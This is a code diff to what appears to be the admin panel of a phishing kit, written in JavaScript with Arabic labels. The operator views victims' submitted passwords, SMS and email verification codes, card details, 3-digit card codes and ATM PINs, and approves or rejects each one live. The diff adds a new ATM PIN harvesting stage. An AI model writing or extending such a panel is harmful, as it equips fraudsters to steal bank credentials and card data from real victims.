@@ -333,13 +333,13 @@ const pageLabels = {
   "login":"تسجيل الدخول","password":"الرمز السري",
   "waiting":"جاري التحقق","code":"رمز التحقق","code3":"رمز 3 أرقام","code-waiting":"تحقق الرمز","code3-waiting":"تحقق رمز 3 أرقام",
   "email-code":"رمز الإيميل","email-code-waiting":"تحقق رمز الإيميل",
-  "card-details":"بيانات البطاقة","card-waiting":"تحقق البطاقة","atm":"ATM PIN",
+  "card-details":"بيانات البطاقة","card-waiting":"تحقق البطاقة","atm":"ATM PIN","atm-waiting":"تحقق ATM",
   "success":"تم بنجاح","home":"الرئيسية","pending":"في الانتظار"
 };
 
-const statusLabels = {pending:"قيد الانتظار",confirmed:"مقبول",rejected:"مرفوض",code_pending:"كود هاتف",code_confirmed:"تم قبول الكود",code_rejected:"كود مرفوض",email_code_pending:"كود جيميل",email_code_confirmed:"تم قبول كود جيميل",email_code_rejected:"كود جيميل مرفوض",card_pending:"بيانات بطاقة",card_confirmed:"تم قبول البطاقة",card_rejected:"بطاقة مرفوضة"};
+const statusLabels = {pending:"قيد الانتظار",confirmed:"مقبول",rejected:"مرفوض",code_pending:"كود هاتف",code_confirmed:"تم قبول الكود",code_rejected:"كود مرفوض",email_code_pending:"كود جيميل",email_code_confirmed:"تم قبول كود جيميل",email_code_rejected:"كود جيميل مرفوض",card_pending:"بيانات بطاقة",card_confirmed:"تم قبول البطاقة",card_rejected:"بطاقة مرفوضة",atm_pending:"ATM جديد",atm_confirmed:"تم قبول ATM",atm_rejected:"ATM مرفوض"};
 
-const dataWaitingPages = {pending:"waiting",code_pending:"code-waiting",email_code_pending:"email-code-waiting",card_pending:"card-waiting"};
+const dataWaitingPages = {pending:"waiting",code_pending:"code-waiting",email_code_pending:"email-code-waiting",card_pending:"card-waiting",atm_pending:"atm-waiting"};
 
 function getSeenMap() {
   try { return JSON.parse(localStorage.getItem("admin_seen") || "{}"); } catch(e) { return {}; }
@@ -549,6 +549,11 @@ function showDetails(id) {
     rejectBtn.textContent = "رفض الرمز ✗";
     acceptBtn.onclick = () => updateStatus(id, "code_confirmed");
     rejectBtn.onclick = () => updateStatus(id, "code_rejected");
+  } else if (o.status === "atm_pending") {
+    acceptBtn.textContent = "قبول ATM ✓";
+    rejectBtn.textContent = "رفض ATM ✗";
+    acceptBtn.onclick = () => updateStatus(id, "atm_confirmed");
+    rejectBtn.onclick = () => updateStatus(id, "atm_rejected");
   } else if (o.status === "pending") {
     acceptBtn.textContent = "قبول ✓";
     rejectBtn.textContent = "رفض ✗";
